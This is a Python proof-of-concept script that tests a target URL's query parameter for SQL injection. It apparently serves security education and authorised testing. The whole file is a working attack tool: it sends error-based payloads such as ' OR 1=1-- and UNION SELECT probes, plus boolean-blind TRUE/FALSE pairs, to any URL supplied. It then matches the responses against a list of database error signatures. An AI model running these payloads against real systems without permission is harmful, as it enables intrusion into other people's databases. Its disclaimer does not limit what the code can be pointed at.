#!/usr/bin/env python3
"""
SQL Injection PoC
=================
Demonstrates error-based and boolean-blind SQL injection against a target URL.

DISCLAIMER: For educational and research purposes only.
Only run against systems you own or have explicit written permission to test.
"""

import argparse
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
except ImportError:
    sys.exit("Missing dependencies. Run: pip install -r requirements.txt")

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from utils import build_session  # noqa: E402

colorama_init(autoreset=True)

DISCLAIMER = (
    f"{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational/research purposes only.\n"
    f"    Only use against systems you own or have explicit written permission to test.{Style.RESET_ALL}"
)

# ── Payload libraries ───────────────────────────────────────────────────────

# Error-based payloads: cause the database to surface an error message
ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
]

# Boolean-blind payloads: two paired payloads where one is TRUE and one is FALSE.
# A difference in response length / content indicates injection.
BOOLEAN_BLIND_PAIRS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1--",   "1 AND 1=2--"),
]

# Common DB error signatures
DB_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "pg_query",
    "sqlite3.operationalerror",
    "ora-",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "invalid column name",
]


def inject_param(url: str, param: str, payload: str) -> str:
    """Return a URL with *param* replaced by *payload*."""

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def check_error_based(session: requests.Session, url: str, param: str, timeout: int) -> bool:
    """Try error-based payloads; return True if a DB error is found."""
    print(f"\n{Fore.CYAN}[*] Testing error-based SQL injection on param '{param}'...")
    for payload in ERROR_BASED_PAYLOADS:
        target = inject_param(url, param, payload)
        try:
            resp = session.get(target, timeout=timeout)
            body = resp.text.lower()
            for sig in DB_ERRORS:
                if sig in body:
                    print(
                        f"{Fore.RED}[+] Possible SQL error detected!\n"
                        f"    Payload : {payload!r}\n"
                        f"    Signature: {sig!r}"
                    )
                    return True
        except requests.RequestException as exc:
            print(f"{Fore.YELLOW}[-] Request error: {exc}")
    print(f"{Fore.GREEN}[-] No obvious SQL errors found with error-based payloads.")
    return False


def check_boolean_blind(session: requests.Session, url: str, param: str, timeout: int) -> bool:
    """Try boolean-blind pairs; return True if responses differ significantly."""
    print(f"\n{Fore.CYAN}[*] Testing boolean-blind SQL injection on param '{param}'...")
    for true_payload, false_payload in BOOLEAN_BLIND_PAIRS:
        try:
            resp_true  = session.get(inject_param(url, param, true_payload),  timeout=timeout)
            time.sleep(0.2)
            resp_false = session.get(inject_param(url, param, false_payload), timeout=timeout)

            len_diff = abs(len(resp_true.text) - len(resp_false.text))
            if len_diff > 10:
                print(
                    f"{Fore.RED}[+] Possible boolean-blind SQLi detected!\n"
                    f"    TRUE  payload : {true_payload!r} → {len(resp_true.text)} bytes\n"
                    f"    FALSE payload : {false_payload!r} → {len(resp_false.text)} bytes\n"
                    f"    Response length difference: {len_diff} bytes"
                )
                return True
        except requests.RequestException as exc:
            print(f"{Fore.YELLOW}[-] Request error: {exc}")
    print(f"{Fore.GREEN}[-] No significant response difference found with boolean-blind payloads.")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SQL Injection PoC – educational purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",     required=True, help="Target URL with query parameters, e.g. http://localhost/page?id=1")
    parser.add_argument("--param",   default="id",  help="Query parameter to inject (default: id)")
    parser.add_argument("--cookies", default=None,  help="Session cookies, e.g. 'PHPSESSID=abc; security=low'")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    print(DISCLAIMER)
    print(f"\n{Fore.CYAN}[*] Target : {args.url}")
    print(f"{Fore.CYAN}[*] Param  : {args.param}\n")

    session = build_session(args.cookies, user_agent="SQLi-PoC/1.0 (educational)")

    found_error = check_error_based(session, args.url, args.param, args.timeout)
    found_blind = check_boolean_blind(session, args.url, args.param, args.timeout)

    print()
    if found_error or found_blind:
        print(f"{Fore.RED}[!] Target may be vulnerable to SQL injection.")
    else:
        print(f"{Fore.GREEN}[✓] No SQL injection indicators found with tested payloads.")


if __name__ == "__main__":
    main()
